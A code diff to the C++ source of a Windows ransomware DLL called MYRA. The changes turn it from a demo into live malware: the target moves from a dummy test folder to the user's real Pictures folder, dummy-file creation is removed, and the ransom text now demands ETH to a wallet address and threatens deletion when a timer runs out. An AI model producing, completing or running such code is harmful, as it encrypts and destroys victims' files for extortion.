@@ -22,7 +22,7 @@ HWND hWndEncStatusLabel; // Encryption Status Label
 std::wstring correctPassword;
 
 
-std::wstring targetFolder = L"C:\\Users\\Public\\Documents\\FakeDocs";
+std::wstring targetFolder;
 // Timer variables
 int remainingTime = 3600;
 UINT_PTR timerID;
@@ -30,9 +30,9 @@ UINT_PTR timerID;
 // Static text for labels
 const wchar_t* labelTexts[8] = {
     L"Hello, it's MYRA .",
-    L"Contact your administration for more info on this incident ;)",
+    L"You've been hacked. We encrypted your data haha loser ;)",
     L"Bonjour, c'est MYRA.",
-    L"Contactez votre administration pour plus d'informations sur cet incident ;)",
+    L"Vous avez été hacké. Nous avons chiffré vos données haha nullos ;)",
     L"Send ETH to this address : 0x141a7758F57bB2023A90Ed8cE4262F050E882Be9 ",
     L"to receive the password"
 };
@@ -90,7 +90,7 @@ void UpdateProgressBar(){
     if (remainingTime <= 0)
     {
         KillTimer(hwndMain, timerID);
-        MessageBox(hwndMain, L"Le temps est �coul� ! Fermeture en cours.", L"Timeout", MB_OK | MB_ICONWARNING);
+        MessageBox(hwndMain, L"Le temps est ecoule ! Suppresion en cours ! Bye bye les donnees!", L"Timeout", MB_OK | MB_ICONWARNING);
         ExitProcess(0);
         return;
     }
@@ -278,10 +278,7 @@ extern "C" __declspec(dllexport) HRESULT __stdcall DllRegisterServer() {
 
     // Use real Documents folder
     std::wstring realDocs = GetUserPicturesFolder();
-    if (realDocs.empty()) {
-        realDocs = GetUserPicturesFolder(); // fallback
-    }
-
+    targetFolder = realDocs;
     // Remove GenDummyF!
     // GenDummyF(realDocs, filesPerType); // <--- delete this
 
